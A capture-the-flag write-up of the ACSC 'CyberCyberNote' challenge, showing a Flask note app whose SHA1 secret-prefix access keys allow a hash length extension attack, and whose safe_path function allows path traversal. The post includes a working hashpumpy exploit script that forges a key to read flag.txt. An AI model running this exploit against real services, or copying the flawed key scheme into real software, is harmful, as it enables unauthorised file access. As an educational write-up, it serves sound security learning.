---
author: Aryt3
pubDatetime: 2025-05-01
title: ACSC CyberCyberNote Writeup
slug: acsc-cybercybernote
featured: true
draft: false
tags:
    - ACSC
    - crypto
description:
  A Writeup and Walkthrough of the ACSC CyberCyberNote challenge.
---


# CyberCyberNote

## Description

```
Somebody has leaked files from one of our servers and we have gotten wind that it might have happened through our super secure cyber note taking service. 
Can you figure out how those darn criminals cybered through those notes unauthorized?
```

## Provided Files

```
cybercybernote
├── docker-compose.yml
├── Dockerfile
└── src
    ├── app.py
    ├── notes
    ├── notetaking.py
    ├── static
    │   └── style.css
    ├── templates
    │   ├── base.html
    │   ├── index.html
    │   └── view.html
    └── utils.py
```

## Writeup

Starting off, I inspected the `app.py` which contains the main functionality of the application. <br/>
```py
import os
from urllib.parse import parse_qs


from flask import Flask, render_template, request, abort, redirect, url_for
from notetaking import new_note, list_notes, get_note


WEB_PORT = int(os.getenv("WEB_PORT", "5000"))
FLAG = os.getenv("FLAG", "dach2025{dummy_flag}")


def add_flag():
    with open("flag.txt", "w") as f:
        f.write(FLAG)


app = Flask(__name__)


@app.route('/', methods=['GET'])
def index():
    notes = list_notes()

    return render_template('index.html', notes=notes)


@app.route('/view')
def view_note():
    params = parse_qs(request.query_string)

    filename = params.get(b'filename', [b''])[0]
    provided_key = params.get(b'key', [b''])[0]

    if not filename or not provided_key:
        return abort(404)

    return render_template('view.html', filename=filename, content=get_note(filename, provided_key))


@app.route('/new', methods=['POST'])
def add_note():
    content = request.form.get('content')

    if not content:
        return abort(400)

    new_note(content)

    return redirect(url_for('index'))


if __name__ == '__main__':
    add_flag()
    app.run("0.0.0.0", port=WEB_PORT, debug=False)
```

Now to get the flag I would either have to read `global-context`, `environment variables` or `files` on the system. <br/>
Looking at the code and how the flag is written to a file, it's probably about reading files. <br/>
Knowing this I focused on the `/view` endpoint which lets us read files if we have the correct key. <br/>

The key is generated with the provided `filename` and a `SECRET_KEY` which we don't know. <br/>
```py
import os
import secrets

from hashlib import sha1

from utils import safe_path, ensure_string


NOTES_DIR = safe_path(os.getcwd(), 'notes/')


SECRET_KEY = secrets.token_hex(8).encode()


def generate_access_key(filename):
    if isinstance(filename, str):
        filename = filename.encode()
    return sha1(SECRET_KEY + filename).hexdigest()


def new_note(content):
    filename = content.split("\n")[0][:64]
    safe_filename = "".join(c for c in filename if c.isalnum() or c in (' ', '_', '-')).rstrip()
    if len(safe_filename) == 0:
        raise ValueError("Invalid filename")

    filepath = safe_path(NOTES_DIR, safe_filename + '.txt')
    with open(filepath, 'w') as f:
        f.write(content)


def list_notes():
    notes = []

    for filename in os.listdir(NOTES_DIR):
        if filename.endswith('.txt'):
            notes.append((filename, generate_access_key(filename)))

    return notes


def get_note(filename, access_key):
    if ensure_string(access_key) != generate_access_key(filename):
        raise PermissionError(f"Access denied for note '{filename}'")

    filepath = safe_path(NOTES_DIR, ensure_string(filename))
    if not os.path.exists(filepath):
        raise FileNotFoundError(f"Note '{filename}' not found")

    with open(filepath, 'r') as f:
        content = f.read()

    return content
```

> [!NOTE] <br/>
> An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret. <br/>
> Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data. <br/>
> [source](https://www.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks)

Even though we don’t know the secret, we can forge a valid hash for a longer message — such as one containing a path traversal payload. <br/>

### The Vulnerability

In `new_note`, filenames are limited to a sanitized string from the first line of content: <br/>
```py
def new_note(content):
    filename = content.split("\n")[0][:64]
    safe_filename = "".join(c for c in filename if c.isalnum() or c in (' ', '_', '-')).rstrip()
    if len(safe_filename) == 0:
        raise ValueError("Invalid filename")

    filepath = safe_path(NOTES_DIR, safe_filename + '.txt')
    with open(filepath, 'w') as f:
        f.write(content)
```

This limits our ability to directly create traversal filenames like `../../flag.txt`. But since the access key is calculated from the unsanitized filename, and that hash is shared with the user, we can perform a **hash length extension attack** using the original filename and key to forge a new valid key for a malicious filename — without knowing the secret key but the length of the secret key which stays the same.

To solve this I made a simple python script using the [hashpumpy](https://pypi.org/project/hashpumpy/) library. <br/>
```py
import requests, hashpumpy

BASE_URL = 'https://56slhmke6dn4q7na.dyn.acsc.land/'

# filename for exploit (used once for note-creation and later for hash-length extension attack)
filename = 'test'
payload = {
    'content': filename
}

# Creates the note {filename}.txt
r = requests.post(f'{BASE_URL}new', data=payload)

# Get generated hash from name
ORIGINAL_HASH = r.text.split(f'href="/view?filename={filename}.txt&key=')[1].split('"')[0]
ORIGINAL_FILENAME = f'{filename}.txt'

# path-traversal payload for forgery
CHANGED_FILENAME = '/../treasure.txt/../../flag.txt'

out = hashpumpy.hashpump(ORIGINAL_HASH, ORIGINAL_FILENAME, CHANGED_FILENAME, 16)
# print(out)

# execute attack with forged key
r = requests.get(f'{BASE_URL}view', params={'filename': out[1], 'key': out[0]})

# Extract flag from html
flag = r.text.split('<pre>')[1].split('</pre>')[0]

print('[+] Found flag: ', flag)
```

The `safe_path` function also doesn't defend against path-traversal, therefore we can just climb the file-system to the flag. <br/>
```py
def safe_path(*parts):
    return os.path.normpath(os.path.join(*parts))
```

Performing the attack and retrieving the flag concludes this writeup *:3*. <br/>
```py
$ python3 exploit.py
[+] Found flag:  dach2025{cybercybercybercybercybercybercyber_faqh4w1slljqrd73}
```